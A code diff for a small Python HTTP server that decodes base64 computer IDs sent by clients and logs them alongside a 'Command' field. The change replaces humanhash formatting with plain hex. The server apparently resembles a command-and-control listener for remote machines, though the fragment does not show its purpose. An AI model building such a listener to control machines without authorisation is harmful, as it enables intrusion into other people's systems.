@@ -1,7 +1,7 @@
 import os
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 from datetime import datetime
-import humanhash
+# import humanhash
 import base64
 
 
@@ -50,9 +50,11 @@ class CustomHandler(SimpleHTTPRequestHandler):
         if computer_id:
             decoded_bytes = base64.b64decode(computer_id)
             hex_string = decoded_bytes.hex()
-            computer_id = humanhash.humanize(hex_string)
+            computer_id = hex_string
+            # computer_id = humanhash.humanize(hex_string)
             print(f"[{timestamp}] Received computer ID: {computer_id}")
-        log_data += f'Human-Hash ID: {computer_id}\n'
+        #log_data += f'Human-Hash ID: {computer_id}\n'
+        log_data += f'PC ID: {computer_id}\n'
         log_data += f'Command: {response_content}\n\n'
 
         log_transaction(log_data)
